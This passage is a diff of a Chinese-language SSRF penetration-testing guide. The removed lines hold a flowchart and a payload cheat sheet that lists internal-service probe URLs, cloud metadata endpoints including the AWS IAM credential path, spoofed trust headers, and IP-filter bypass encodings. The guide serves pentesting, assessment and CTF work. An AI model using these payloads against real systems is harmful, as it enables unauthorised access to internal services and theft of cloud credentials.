-                    ▼                        ▼                        ▼
-          ┌─────────────────┐      ┌─────────────────┐      ┌─────────────────┐
-          │  发现 SSRF 端点  │      │  发现无认证服务  │      │  发现弱认证服务  │
-          └────────┬────────┘      └────────┬────────┘      └────────┬────────┘
-                   │                        │                        │
-                   ▼                        ▼                        ▼
-          ┌─────────────────┐      ┌─────────────────┐      ┌─────────────────┐
-          │  ref/ssrf-      │      │  ref/no-auth-   │      │  ref/auth-      │
-          │  attack-        │      │  system-        │      │  bypass.md      │
-          │  advanced.md    │      │  exploitation.md│      │                 │
-          └─────────────────┘      └─────────────────┘      └─────────────────┘
-```
-
----
-
-## 7. 常用 Payload 速查表
-
-### 7.1 内部服务探测
-
-| 目标 | Payload | 说明 |
-|------|---------|------|
-| Docker DNS | `http://internal-service/` | Docker 内部 DNS |
-| K8s DNS | `http://kubernetes.default/` | K8s 服务发现 |
-| AWS 元数据 | `http://169.254.169.254/latest/meta-data/` | EC2 元数据 |
-| GCP 元数据 | `http://metadata.google.internal/` | GCP 元数据 |
-| Azure 元数据 | `http://169.254.169.254/metadata/instance` | Azure 元数据 |
-
-### 7.2 信任 Header
-
-| Header | 用途 | 示例 |
-|--------|------|------|
-| `X-Internal-Request` | 标记内部请求 | `X-Internal-Request: true` |
-| `X-Service-Name` | 服务标识 | `X-Service-Name: trusted-service` |
-| `X-Forwarded-For` | 源 IP 欺骗 | `X-Forwarded-For: 127.0.0.1` |
-| `X-Real-IP` | 真实 IP | `X-Real-IP: 10.0.0.1` |
-| `X-Admin` | 管理员请求 | `X-Admin: true` |
-
-### 7.3 云元数据端点
-
-| 云服务商 | 端点 | 说明 |
-|---------|------|------|
-| AWS | `169.254.169.254/latest/meta-data/` | EC2 实例元数据 |
-| AWS | `169.254.169.254/latest/meta-data/iam/` | IAM 角色凭证 |
-| GCP | `metadata.google.internal/computeMetadata/v1/` | GCP 元数据 |
-| Azure | `169.254.169.254/metadata/instance` | Azure 实例元数据 |
-| Alibaba | `100.100.100.200/latest/meta-data/` | 阿里云元数据 |
-
-### 7.4 绕过技术
-
-| 技术 | Payload | 说明 |
-|------|---------|------|
-| 八进制 IP | `http://0177.0.0.1/` | 绕过 IP 过滤 |
-| 十六进制 IP | `http://0x7f000001/` | 绕过 IP 过滤 |
-| IPv6 映射 | `http://[::ffff:127.0.0.1]/` | 绕过 IPv4 过滤 |
-| DNS 重绑定 | `http://sslip.io/` | 绕过 DNS 检查 |
-| URL@混淆 | `http://allowed.com@127.0.0.1/` | 绕过 URL 检查 |
-
----
-
-## 8. 参考资源
-
-- [OWASP Top 10:2025 A06 Insecure Design](https://owasp.org/Top10/2025/A06_2025-Insecure_Design/)
-- [OWASP SSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
-- [PortSwigger SSRF Testing](https://portswigger.net/web-security/ssrf)
-- [AWS SSRF 防护](https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-ssrf.html)
-- [微服务安全最佳实践](https://owasp.org/www-project-microservice-security/)
+**文档版本：** 1.0
+**最后更新：** 2026 年 3 月
+**适用场景：** 渗透测试、安全评估、CTF 挑战
